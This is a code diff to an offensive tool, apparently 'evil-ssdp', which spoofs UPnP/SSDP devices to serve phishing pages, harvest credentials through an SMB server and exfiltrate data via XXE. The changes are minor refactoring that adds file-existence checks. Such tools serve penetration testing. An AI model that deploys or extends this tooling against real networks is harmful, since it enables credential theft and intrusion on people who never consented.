@@ -68,8 +68,8 @@ class PC:
     note_box = green + '[+] ' + endc
     warn_box = orange + '[!] ' + endc
     msearch_box = blue + '[M-SEARCH]     ' + endc
-    xml_box = green + '[XML REQUEST]  ' + endc
-    dial_box = green + '[DIAL REQUEST] ' + endc
+    xml_box = green + '[SSDP XML]     ' + endc
+    dial_box = green + '[DIAL REST]    ' + endc
     phish_box = red + '[PHISH HOOKED] ' + endc
     creds_box = red + '[CREDS GIVEN]  ' + endc
     xxe_box = red + '[XXE VULN!!!!] ' + endc
@@ -241,13 +241,18 @@ def build_class(upnp_args):
             """
             Builds the device descriptor XML file.
             """
-            variables = {'local_ip': local_ip,
-                         'local_port': local_port,
-                         'smb_server': smb_server,
-                         'session_usn': session_usn}
-            file_in = open(template_dir + '/device.xml')
-            template = Template(file_in.read())
-            xml_file = template.substitute(variables)
+            file_path = template_dir + '/device.xml'
+            print(file_path)
+            if os.path.isfile(file_path):
+                variables = {'local_ip': local_ip,
+                             'local_port': local_port,
+                             'smb_server': smb_server,
+                             'session_usn': session_usn}
+                file_in = open(file_path)
+                template = Template(file_in.read())
+                xml_file = template.substitute(variables)
+            else:
+                xml_file ='.'
             return xml_file
 
         @staticmethod
@@ -257,13 +262,17 @@ def build_class(upnp_args):
             Might be a good XXE injection point, if an app uses a different
             library to parse the DIAL spec than the original SSDP spec.
             """
-            variables = {'local_ip': local_ip,
-                         'local_port': local_port,
-                         'smb_server': smb_server,
-                         'session_usn': session_usn}
-            file_in = open(template_dir + '/dial.xml')
-            template = Template(file_in.read())
-            xml_file = template.substitute(variables)
+            file_path = template_dir + '/dial.xml'
+            if os.path.isfile(file_path):
+                variables = {'local_ip': local_ip,
+                             'local_port': local_port,
+                             'smb_server': smb_server,
+                             'session_usn': session_usn}
+                file_in = open(file_path)
+                template = Template(file_in.read())
+                xml_file = template.substitute(variables)
+            else:
+                xml_file = '.'
             return xml_file
 
         @staticmethod
@@ -272,10 +281,11 @@ def build_class(upnp_args):
             Builds the service descriptor XML file.
             ***Not yet implemented in evil-ssdp***
             """
-            if 'service.xml' in template_dir:
+            file_path = template_dir + '/service.xml'
+            if os.path.isfile(file_path):
                 variables = {'local_ip': local_ip,
                              'local_port': local_port}
-                file_in = open(template_dir + '/service.xml')
+                file_in = open(file_path)
                 template = Template(file_in.read())
                 xml_file = template.substitute(variables)
             else:
@@ -287,11 +297,15 @@ def build_class(upnp_args):
             """
             Builds the phishing page served when users open up an evil device.
             """
-            variables = {'smb_server': smb_server,
-                         'redirect_url': redirect_url}
-            file_in = open(template_dir + '/present.html')
-            template = Template(file_in.read())
-            phish_page = template.substitute(variables)
+            file_path = template_dir + '/present.html'
+            if os.path.isfile(file_path):
+                variables = {'smb_server': smb_server,
+                             'redirect_url': redirect_url}
+                file_in = open(file_path)
+                template = Template(file_in.read())
+                phish_page = template.substitute(variables)
+            else:
+                phish_page = '.'
             return phish_page
 
         @staticmethod
@@ -300,10 +314,11 @@ def build_class(upnp_args):
             Builds the required page for data exfiltration when used with the
             xxe-exfil template.
             """
-            if 'xxe-exfil' in template_dir:
+            file_path = template_dir + '/data.dtd'
+            if os.path.isfile(file_path):
                 variables = {'local_ip': local_ip,
                              'local_port': local_port}
-                file_in = open(template_dir + '/data.dtd')
+                file_in = open(file_path)
                 template = Template(file_in.read())
                 exfil_page = template.substitute(variables)
             else:
@@ -335,7 +350,6 @@ def build_class(upnp_args):
                 # It  PROBABLY won't interfere with other SSDP stuff.
                 rest_url = ('http://{}:{}/dial-rest-service/'
                             .format(local_ip, local_port))
-                #rest_url = 'file://{}/rest'.format(local_ip)
                 self.send_header('Application-URL', rest_url)
                 self.end_headers()
                 self.wfile.write(self.build_device_xml().encode())
